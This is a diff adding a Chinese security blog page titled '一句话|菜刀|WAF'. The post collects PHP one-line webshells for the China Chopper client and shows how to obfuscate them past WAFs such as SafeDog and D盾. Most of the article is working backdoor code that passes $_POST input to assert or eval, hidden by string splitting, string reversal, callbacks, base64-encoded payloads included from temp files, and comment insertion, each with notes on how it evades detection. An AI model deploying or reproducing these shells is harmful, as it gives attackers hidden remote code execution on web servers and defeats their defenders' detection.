@@ -1,0 +1,938 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Web安全,一句话,菜刀,WAF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="一句话&amp;amp;菜刀&amp;amp;waf01-一句话收集1.1-">
+<meta name="keywords" content="Web安全,一句话,菜刀,WAF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一句话|菜刀|WAF">
+<meta property="og:url" content="http://21guns.top/2018/01/22/一句话-菜刀-WAF/index.html">
+<meta property="og:site_name" content="Ry1ynn&#39;s blogs">
+<meta property="og:description" content="一句话&amp;amp;菜刀&amp;amp;waf01-一句话收集1.1-">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-02-18T07:39:37.654Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一句话|菜刀|WAF">
+<meta name="twitter:description" content="一句话&amp;amp;菜刀&amp;amp;waf01-一句话收集1.1-">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://21guns.top/2018/01/22/一句话-菜刀-WAF/">
+
+
+
+
+
+  <title>一句话|菜刀|WAF | Ry1ynn's blogs</title>
+  
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ry1ynn's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2018/01/22/一句话-菜刀-WAF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ry1ynn">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ry1ynn's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一句话|菜刀|WAF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-22T15:11:39+08:00">
+                2018-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全基础/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全基础</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="一句话-amp-菜刀-amp-waf"><a href="#一句话-amp-菜刀-amp-waf" class="headerlink" title="一句话&amp;菜刀&amp;waf"></a>一句话&amp;菜刀&amp;waf</h1><h2 id="01-一句话收集"><a href="#01-一句话收集" class="headerlink" title="01-一句话收集"></a>01-一句话收集</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1.1-"></a>1.1-</h3><a id="more"></a>
+<ul>
+<li><p>原文：<code>https://www.t00ls.net/thread-41384-1-1.html</code></p>
+</li>
+<li><p>code</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $dogkill=strtoupper(<span class="string">'ass'</span>);</span><br><span class="line">    $dogri=strtoupper(<span class="string">'ert'</span>);</span><br><span class="line">    $funcName=strtoupper($dogkill.$dogri);</span><br><span class="line">    $dogkilling=<span class="string">'funcName'</span>;</span><br><span class="line">    @$$dogkilling($_POST[w]);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>关键点：</p>
+<ul>
+<li>大小写变换；</li>
+<li>php动态变量；</li>
+</ul>
+</li>
+</ul>
+<h3 id="1-2"><a href="#1-2" class="headerlink" title="1.2-"></a>1.2-</h3><ul>
+<li><p>code</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span><span class="params">($b,$c)</span></span>&#123;</span><br><span class="line">	$b=strrev($b);</span><br><span class="line">	array_map(substr_replace($b, <span class="string">'ss'</span>, <span class="number">1</span>, <span class="number">0</span>),<span class="keyword">array</span>($c));</span><br><span class="line">&#125;</span><br><span class="line">fun(<span class="string">"trea"</span>,$_POST[<span class="string">'pass'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>关键点</p>
+<ul>
+<li>构造函数，调用函数；</li>
+<li>字符串翻转及子串替换；</li>
+<li>array_map函数回调；</li>
+</ul>
+</li>
+<li><p>其它</p>
+<ul>
+<li>d盾会对base64_decode($_POST[‘T00ls’])中编码函数敏感；其与狗的检测策略不同；</li>
+<li>带base64编码的，过狗不一定过盾；</li>
+</ul>
+</li>
+</ul>
+<h3 id="1-3"><a href="#1-3" class="headerlink" title="1.3-"></a>1.3-</h3><ul>
+<li><p>原文：<code>https://www.t00ls.net/thread-41389-1-1.html</code></p>
+</li>
+<li><p>code</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$payload = <span class="string">&lt;&lt;&lt;s</span></span><br><span class="line"><span class="string">PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwpmdW5jdGlvbiBmdW4oJGIsJGMpewoJJGI9c3RycmV2KCRiKTsKCWFycmF5X21hcChzdWJzdHJfcmVwbGFjZSgkYiwgJ3NzJywgMSwgMCksYXJyYXkoJGMpKTsKfQpmdW4oInRyZWEiLCRfUE9TVFsncGFzcyddKTsKPz4=</span></span><br><span class="line"><span class="string">s;</span></span><br><span class="line">$file = tempnam(sys_get_temp_dir(), <span class="string">''</span>);              </span><br><span class="line">fwrite(fopen($file, <span class="string">'w'</span>), base64_decode($payload));         </span><br><span class="line"><span class="keyword">include</span> $file;         </span><br><span class="line">unlink($file);         </span><br><span class="line">var_dump(file_exists($file)); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>注意</p>
+<ul>
+<li>2中代码base64编码；<br>写入临时缓存文件file，写入文件时base64解码；<br>文件包含；<br>马上删除，并检测是否删除；<br>密码便是2中pass，亲测可行；</li>
+<li>也可以对2中代码处<code>fun(&quot;trea&quot;,$_POST[&#39;pass&#39;]);变为fun(&quot;trea&quot;,base64_decode($_POST[&#39;pass&#39;]));</code><br>再将其base编码赋值给base64；<br>加入了base64解码函数，旧版菜刀应付不了，需使用16版并更改配置文件；<br>（见下面菜刀版本相关）</li>
+</ul>
+</li>
+<li><p>小结：</p>
+<ul>
+<li><code>@eval($_POST[&#39;pass&#39;]);</code>———旧版菜刀；</li>
+<li><code>@eval(base64_decode($_POST[&#39;pass&#39;]));</code>————16版并改配置文件；</li>
+</ul>
+</li>
+</ul>
+<h2 id="02-过狗相关"><a href="#02-过狗相关" class="headerlink" title="02-过狗相关"></a>02-过狗相关</h2><h3 id="2-1-回调函数过狗"><a href="#2-1-回调函数过狗" class="headerlink" title="2.1-回调函数过狗"></a>2.1-回调函数过狗</h3><ul>
+<li><p>相关链接<code>https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html</code></p>
+</li>
+<li><p>常用函数</p>
+<ul>
+<li><code>call_user_func(&#39;assert&#39;, $_POST[&#39;pass&#39;]);</code></li>
+<li><code>call_user_func_array(&#39;assert&#39;, array($_POST[&#39;pass&#39;]));</code></li>
+<li><code>array_filter(array($_POST[&#39;pass&#39;]), &#39;assert&#39;);</code></li>
+<li><code>array_map(&#39;assert&#39;,array($_POST[&#39;pass&#39;]));</code></li>
+</ul>
+</li>
+<li><p>code</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'test'</span>,$_POST[<span class="string">'pass'</span>]);</span><br><span class="line">uasort($a,<span class="string">'assert'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>注意</p>
+<ul>
+<li>只能传入变量，因此是$a；</li>
+<li>assert 在版本5.4.8 增加了参数description，因此加’test’作为参数；</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-2-一句话原理及过狗"><a href="#2-2-一句话原理及过狗" class="headerlink" title="2.2-一句话原理及过狗"></a>2.2-一句话原理及过狗</h3><ul>
+<li><code>https://bbs.ichunqiu.com/thread-17816-1-1.html</code></li>
+<li><code>https://www.t00ls.net/articles-33457.html</code></li>
+</ul>
+<h3 id="2-3-菜刀配置文件"><a href="#2-3-菜刀配置文件" class="headerlink" title="2.3-菜刀配置文件"></a>2.3-菜刀配置文件</h3><ul>
+<li><code>http://www.uedbox.com/caidao-conf-detailed/</code></li>
+<li><code>https://www.404sec.com/7512.html</code></li>
+<li><code>https://www.scanfsec.com/%E7%AE%80%E5-%8D%95%E4%BD%BF%E7%94%A8%E6%96%B0%E7%89%88%E8%8F%9C%E5%88%80%E8%BF%87waf.html</code>（主）</li>
+</ul>
+<h3 id="2-4-菜刀配置并过狗"><a href="#2-4-菜刀配置并过狗" class="headerlink" title="2.4-菜刀配置并过狗"></a>2.4-菜刀配置并过狗</h3><ul>
+<li>待学习</li>
+<li><code>https://www.scanfsec.com/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E6%96%B0%E7%89%88%E8%8F%9C%E5%88%80%E8%BF%87waf.html</code>（主）</li>
+</ul>
+<h2 id="03-一句话绕WAF（XD-）"><a href="#03-一句话绕WAF（XD-）" class="headerlink" title="03-一句话绕WAF（XD-）"></a>03-一句话绕WAF（XD-）</h2><ul>
+<li><p>几个例子</p>
+<ul>
+<li><p><code>&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;shezhang&quot;]); ?&gt;</code></p>
+</li>
+<li><p><code>&lt;?php $lang = (string)key($_POST);$lang($_POST[&#39;shezhang&#39;]);?&gt;</code></p>
+</li>
+<li><p><code>&lt;?php $k=&quot;ass&quot;.&quot;ert&quot;; $k(${&quot;_PO&quot;.&quot;ST&quot;} [&#39;shezhang&#39;]);?&gt;</code></p>
+</li>
+<li><p><code>&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[&quot;shezhang&quot;]);  ?&gt;</code></p>
+</li>
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                  </span><br><span class="line">@$_=<span class="string">"s"</span>.<span class="string">"s"</span>.<span class="comment">/*-/*-*/</span><span class="string">"e"</span>.<span class="comment">/*-/*-*/</span><span class="string">"r"</span>;                  </span><br><span class="line">@$_=<span class="comment">/*-/*-*/</span><span class="string">"a"</span>.<span class="comment">/*-/*-*/</span>$_.<span class="comment">/*-/*-*/</span><span class="string">"t"</span>;                  </span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">"_P"</span>.<span class="comment">/*-/*-*/</span><span class="string">"OS"</span>.<span class="comment">/*-/*-*/</span><span class="string">"T"</span>&#125;   </span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span>-<span class="comment">/*-/*-*/</span><span class="number">2</span><span class="comment">/*-/*-*/</span>-<span class="comment">/*-/*-*/</span><span class="number">5</span><span class="comment">/*-/*-*/</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?Php</span></span><br><span class="line">$ddlj6=”VDFOVVd5″;$fnvy4=”UUdWMllX”;$olsi8=”d29KRjlR”;$ssay3=”ZDVlR3RqWnpZblhTazc=”;</span><br><span class="line">$lram4 = str_replace(“vh3″,””,”vh3svh3tvh3rvh3_rvh3evh3plvh3avh3ce”);</span><br><span class="line">$sfjr7 = $lram4(“tf4”, “”, “tf4batf4stf4e6tf44tf4_tf4dtf4etf4ctf4otf4dtf4e”);</span><br><span class="line">$icxd7 = $lram4(“hsm1″,””,”hsm1chsm1rehsm1athsm1ehsm1_fhsm1unchsm1thsm1iohsm1n”);</span><br><span class="line">$jmpl7 = $icxd7(”, $sfjr7($sfjr7($lram4(“<span class="comment">#;*,.”, “”, $fnvy4.$olsi8.$ddlj6.$ssay3)))); $jmpl7();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>编写思路</p>
+<ul>
+<li>关键字打乱</li>
+<li>替换更改</li>
+<li>猜分组合</li>
+<li>编码解码</li>
+<li>函数调用</li>
+</ul>
+</li>
+<li><p>实例说明</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$a0=$_GET[<span class="string">'a'</span>];<span class="comment">//a=t</span></span><br><span class="line">$t=$_GET[<span class="string">'b'</span>];<span class="comment">//b=assert</span></span><br><span class="line">$$a0($_REQUEST[qq]);</span><br><span class="line"></span><br><span class="line"><span class="comment">##################################</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/test/blfg/cd.php?a=t&amp;b=assert</span></span><br><span class="line"></span><br><span class="line">$a0=’t’</span><br><span class="line">$t=’assert’</span><br><span class="line">$$a0=$t=assert</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>功能型菜刀绕过拦截解决办法</p>
+<ul>
+<li>自写功能数据包</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/一句话/" rel="tag"># 一句话</a>
+          
+            <a href="/tags/菜刀/" rel="tag"># 菜刀</a>
+          
+            <a href="/tags/WAF/" rel="tag"># WAF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/22/其它杂乱漏洞/" rel="next" title="其它杂乱漏洞">
+                <i class="fa fa-chevron-left"></i> 其它杂乱漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/01/22/提权相关/" rel="prev" title="提权相关">
+                提权相关 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ry1ynn">
+            
+              <p class="site-author-name" itemprop="name">Ry1ynn</p>
+              <p class="site-description motion-element" itemprop="description">我们的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">108</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ry1ynn" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ry1ynn_pri@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5794121667" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/images/weixin.JPG" target="_blank" title="Wechat">
+                      
+                        <i class="fa fa-fw fa-weixin"></i>Wechat</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.91ri.org/" title="91Ri" target="_blank">91Ri</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.52pojie.cn/" title="吾爱破解" target="_blank">吾爱破解</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.anquanke.com/" title="安全客" target="_blank">安全客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ichunqiu.com/" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一句话-amp-菜刀-amp-waf"><span class="nav-text">一句话&amp;菜刀&amp;waf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#01-一句话收集"><span class="nav-text">01-一句话收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1"><span class="nav-text">1.1-</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2"><span class="nav-text">1.2-</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3"><span class="nav-text">1.3-</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-过狗相关"><span class="nav-text">02-过狗相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-回调函数过狗"><span class="nav-text">2.1-回调函数过狗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-一句话原理及过狗"><span class="nav-text">2.2-一句话原理及过狗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-菜刀配置文件"><span class="nav-text">2.3-菜刀配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-菜刀配置并过狗"><span class="nav-text">2.4-菜刀配置并过狗</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-一句话绕WAF（XD-）"><span class="nav-text">03-一句话绕WAF（XD-）</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ry1ynn</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
